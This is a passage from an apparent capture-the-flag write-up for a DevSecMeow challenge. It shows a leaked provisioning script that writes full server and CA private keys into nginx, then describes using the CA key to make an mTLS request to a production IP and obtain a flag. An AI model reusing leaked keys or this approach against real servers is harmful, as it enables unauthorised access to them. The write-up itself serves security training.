irecUisqLkpmAZRTGGbK98hN1muV85LRsyQTfesVNCT8Az3g0UUFN6rQdMoAqn97
lA/pK4N7Nxi7HDhaipZQ6uPcGVQkrcKOScxq7Y1IJ1Nq0qpKlrx2QIzB3rpE1Cpm
eYX1qHqgfLc+WGbwFfWF9raSG0bbLmB+krXtTUEqorTtr4RUQ3JCh0moJ5ToUgzc
qaYdKV87JdAsh88Dc8R4xEy+CgmP0Tecsdu4vp+QGLIFyKVXV1nPWF2ihz8XelLe
KiNii7b6V43HSrA=
-----END CERTIFICATE-----

EOL
cat <<\EOL > /etc/nginx/server.key
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----

EOL
cat <<\EOL > /etc/nginx/ca.crt
-----BEGIN CERTIFICATE-----
MIIDITCCAgmgAwIBAgIUQ3SN/Ic7T2x1v6cA6gKPUxNSlNgwDQYJKoZIhvcNAQEL
BQAwIDEeMBwGA1UEAwwVZGV2c2VjbWVvdy1wcm9kdWN0aW9uMB4XDTIzMDcyMTE0
NTA0MFoXDTI0MDcyMDE0NTA0MFowIDEeMBwGA1UEAwwVZGV2c2VjbWVvdy1wcm9k
dWN0aW9uMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxNkskbb7nqRD
nVMFJrWQUYuCURyYjncGVZTEFzO1cOOEAR35DmcRuVgWTACUJdRRqb6lL/7Vbfgm
1TV8vj7x/qNciEvd4/NzotlBXYCXJLilLFUydxuEqzpxX9fCGxQJ0nsKDswYuUpi
7ire952y8YAlu/DAApfwm/K8rS2edvvJ22wr1QznmEIedf3GFI3giFgyiB81bmqs
W+vLwd599seSVc48sm4VdIbw1KxQrQVU9Rwr7VyR7frFIitPIpTRfD6P/vZAZSmd
icPAq+2iDGj1YEy4AfRsn+ah7XQqp5ZC4iZccZidHGVlHSmsDXqJ2kpweuYoVCzy
HjMIuPqkDwIDAQABo1MwUTAdBgNVHQ4EFgQUr87qLf+IfGrfkYajdItqMFzby78w
HwYDVR0jBBgwFoAUr87qLf+IfGrfkYajdItqMFzby78wDwYDVR0TAQH/BAUwAwEB
/zANBgkqhkiG9w0BAQsFAAOCAQEAum41R46j6OlqmqdvEgt3D5pCsTa7fwfbvdqp
FgSlsGrwtRzAxETYPj6d+kYliFI/Z46tE3x15F5zisPPT3F/HjqzLPJBvCQWjiHW
+nRniqn5OzwgCsKB8kIVO01tE02ibWyIzL15s8IvzNTDH/WUUf1YvN/QKrvr7NC1
fGui/34w/Sikc1ckuayOM6B6yhf2WoCtC/txaGBxSa95tqSADxiw2X4ru7vuDqJO
TNVZrU3IkDCUhRSxvcesm4of0B21GCmpcUAU75A+UF3sl8jFTNf8oMFZzW17W4bg
tMdad2Pvl9IL3bWjT0uWMOU7uFWHRFCKEVrzCzJ6sUdyamwsLg==
-----END CERTIFICATE-----

EOL
cat <<\EOL > /etc/nginx/ca.key
-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDE2SyRtvuepEOd
UwUmtZBRi4JRHJiOdwZVlMQXM7Vw44QBHfkOZxG5WBZMAJQl1FGpvqUv/tVt+CbV
NXy+PvH+o1yIS93j83Oi2UFdgJckuKUsVTJ3G4SrOnFf18IbFAnSewoOzBi5SmLu
Kt73nbLxgCW78MACl/Cb8rytLZ52+8nbbCvVDOeYQh51/cYUjeCIWDKIHzVuaqxb
68vB3n32x5JVzjyybhV0hvDUrFCtBVT1HCvtXJHt+sUiK08ilNF8Po/+9kBlKZ2J
w8Cr7aIMaPVgTLgB9Gyf5qHtdCqnlkLiJlxxmJ0cZWUdKawNeonaSnB65ihULPIe
Mwi4+qQPAgMBAAECggEBAKABg7fiC/90uD0uWXaQiQGvq7rwypSq7SwtY4MUlfxw
A0HBMkvhvcdxcZZPthxVzBd1DuLHeocL+cy+0Gn30k7QTQvA11lN74XEoNw3BSRl
LmWtzvqAFMP2Gmf0giPuktlTB+blQYeDjozXriuKNQUWzBVLaVfyVzL8CR+fgDpn
nUai7P0thT8MjxXesVvf1jkq4yZqPMOLNLYEuUn5G+OkNCHoqrc4Ud/Ft1lqd4f1
yvJ+9IDBZ298+HhCnlwyZ+ipTZFTcgzV6o/f4Hq0hfiqGx0es0Gt+jtkpR99AS4A
xGGU9CMy2bKk7k5aaoin7dljiIcTrCkWsnCgaVHPNLkCgYEA4bW0AmHWFmzABT/T
TzzgQKJsFvwvKDWOJiDVTczZlTfXeWcM9WQtAecAk2ZxAZqtqXEatzhWsGIvmxMr
zMKz9RLxxRsttV4xzRwDfcjKzRuZAV0xXPsIuaZPpzrqCX8uFrvhijf8prWuLFZr
2mC7kxVVpfDjO68e74YJVSKmOgUCgYEA30Pua0vOPXFL2h8TcbjG9FyTxid4OQWE
s1IiLYRw3jVVWlJ2gAlZ4ey+zTG162zV4V2yHrZF23es45yoWgSRZkxufkQY9CJi
XMXf0qdyC1lVh/naJXdz5AYr5KwyDv9UKjJc6vubcuSmD6h6H3QOgkZeoCt75lwy
jKwwSRRL/gMCgYB4AoLp2VdZqQ0YPW1/biDWfQX32rLAMGmagE6qBUeTfZOGK3LK
by83GbpGpWtkrPe1ZjwMO1psgmhJjhH113iT0DTY1rChBKp6InEAymh6Ujgyb3i1
tYxYGcO0aTDTR9oboF41fbtKcMNhM7o47MIPXIKjrsdDjsNmG+COcdPseQKBgQC5
niqb/dwrbQQZBfkOdQbDpiwddDcZgSMASuqrWQ7VTxX1D9YBQMT/depzgj6yyjtP
MKyjp/qQKgENAvNcU6vmlujOBSOR5PxOERyycA/6q3zWnbzlpVguXYskhJzhpxl8
M37YxfJJJRuCrRlLCRv+5y5Ij55kuIY2Ofmy6DL9rQKBgQDefTgiSKVIlMpZRiGt
VOAD0MFda/k9tpTPT9HdlL4b44mkNzPailJATH0XLDqSwuXn4wJEgMAwqbM8CGSo
Opar3fixSriKkwuTuDy8fM1dbpjYCi8rKswGULTvpFHJQZSDu4+sCDxbZUv9VTAS
aUwjOeYyIZiB+SQt/kUUZm1acA==
-----END PRIVATE KEY-----

EOL
aws s3 cp s3://devsecmeow2023flag2/index.html /tmp/
sudo cp /tmp/index.html /var/www/html
rm /tmp/index.html
sudo systemctl restart nginx
```

I used the `ca.crt` and `ca.key` to [make the same MTLS request](./Challenge%207/Production%20Server/solve.py) to `https://54.255.155.134/`.

![picture 3](images/080ddbdbc0362de0b955be78b67bfa4bb9c76a99e6b67c9035c7208cbbf9a699.png)  
Flag 2: `yOuR_d3vSeCOps_P1peL1nEs!!<##:3##>}`